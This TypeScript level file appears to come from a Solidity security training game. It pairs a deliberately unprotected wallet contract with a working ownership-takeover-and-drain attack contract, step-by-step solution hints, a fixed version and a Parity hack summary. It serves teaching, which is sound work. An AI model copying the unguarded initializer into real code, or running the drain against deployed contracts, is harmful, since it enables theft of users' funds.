import type { Level } from '@/types';

const level: Level = {
  id: 2,
  title: 'Ownership Takeover',
  slug: 'ownership',
  difficulty: 'Easy',
  category: 'Access Control',
  description:
    'Access control vulnerabilities occur when critical functions lack proper authorization checks. If a function that changes the contract owner is left public without a modifier restricting who can call it, any address can take over the contract and steal funds or disrupt operations.',
  objective:
    'Become the owner of the VulnerableWallet contract by exploiting the unprotected initializeOwner() function, then drain all funds.',
  vulnerableContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableWallet {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    // Vulnerability: this function has no access control
    // It was intended to be called only once during setup,
    // but anyone can call it to change the owner
    function initializeOwner(address _newOwner) public {
        owner = _newOwner;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(_amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
  attackContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableWallet.sol";

contract OwnershipAttack {
    VulnerableWallet public target;

    constructor(address _targetAddress) {
        target = VulnerableWallet(payable(_targetAddress));
    }

    function attack() external {
        // Step 1: Take ownership by calling the unprotected function
        target.initializeOwner(address(this));

        // Step 2: Drain all funds
        uint256 balance = target.getBalance();
        if (balance > 0) {
            target.withdraw(balance);
        }
    }

    receive() external payable {}
}`,
  hints: [
    'Look at every public function in the contract. Is there one that should have restricted access but does not?',
    'The initializeOwner() function changes the owner state variable. Who is allowed to call it? Is there any require() or modifier that restricts access?',
    'Call initializeOwner(yourAddress) directly. Once you are the owner, call withdraw() to drain the contract balance.',
  ],
  solution:
    'Call initializeOwner() with your own address (or your attack contract\'s address) as the argument. Since there is no access control modifier or require statement, the function executes and sets you as the new owner. Then call withdraw() with the full contract balance to drain the funds.',
  explanation:
    'The vulnerability is a missing access control check. The initializeOwner() function was likely meant for a one-time setup, but the developer forgot to add a modifier (like onlyOwner) or a state flag (like initialized) to prevent it from being called again. In Solidity, any public function can be called by any external address. Without explicit restrictions, sensitive operations like ownership transfers are exposed to everyone. This is a common pattern in contracts that separate initialization from construction, especially in proxy patterns.',
  secureCoding: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureWallet {
    address public owner;
    bool private initialized;
    mapping(address => uint256) public balances;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        initialized = true;
    }

    // Fix: Add initialization guard and access control
    function initializeOwner(address _newOwner) public onlyOwner {
        require(!initialized, "Already initialized");
        require(_newOwner != address(0), "Invalid address");
        owner = _newOwner;
        initialized = true;
    }

    // Better: Use a two-step ownership transfer
    address public pendingOwner;

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Invalid address");
        pendingOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == pendingOwner, "Not pending owner");
        owner = pendingOwner;
        pendingOwner = address(0);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Insufficient balance");
        payable(owner).transfer(_amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
  realWorldImpact:
    'Parity Wallet Hack (2017) - The Parity multisig wallet library contract had an unprotected initWallet() function. An attacker called it to become the owner of the library contract, then called kill() to selfdestruct it. This froze approximately 513,774 ETH (over $150 million at the time) belonging to 587 wallets that depended on the library. The funds remain locked to this day.',
  moduleMapping: 'Module 3.4 Secure Code Review',
  attackSteps: [
    {
      title: 'Identify the Vulnerability',
      description:
        'The attacker reviews the contract source code and discovers that initializeOwner() is a public function with no access control. Anyone can call it to change the owner.',
      stateChange: 'Reconnaissance complete. Target: initializeOwner()',
    },
    {
      title: 'Take Ownership',
      description:
        'The attacker calls initializeOwner() with their own address. The function has no require checks or modifiers, so it executes successfully and overwrites the owner.',
      code: 'vulnerableWallet.initializeOwner(attackerAddress);',
      stateChange: 'owner: originalDeployer -> attackerAddress',
    },
    {
      title: 'Drain Funds',
      description:
        'Now that the attacker is the owner, they call withdraw() with the full contract balance. The onlyOwner check in withdraw() passes because the attacker is now the owner.',
      code: 'vulnerableWallet.withdraw(vulnerableWallet.getBalance());',
      stateChange: 'Contract balance: X ETH -> 0 ETH. Attacker receives all funds.',
    },
  ],
};

export default level;
